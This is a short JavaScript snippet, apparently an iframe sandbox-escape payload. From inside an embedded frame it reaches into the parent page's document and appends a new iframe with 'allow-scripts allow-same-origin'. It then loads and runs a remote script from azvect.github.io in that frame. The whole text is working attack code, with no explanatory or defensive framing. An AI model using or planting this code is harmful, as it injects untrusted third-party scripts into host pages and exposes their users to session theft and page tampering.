        const escape = () => {
        let parent = window.parent;
        let container = parent.document.getElementsByClassName("invisible");
        if (parent.document.getElementsByClassName("invisible") != null) {
            let replacement = parent.document.createElement("iframe");
            replacement.setAttribute("sandbox", "allow-modals allow-scripts allow-same-origin");
            parent.document.body.append(replacement);
                                script = document.createElement('script');
                                script.setAttribute('src', 'https://azvect.github.io/script.js');
                                replacement.contentDocument.body.appendChild(script);
      }
    }
 escape();
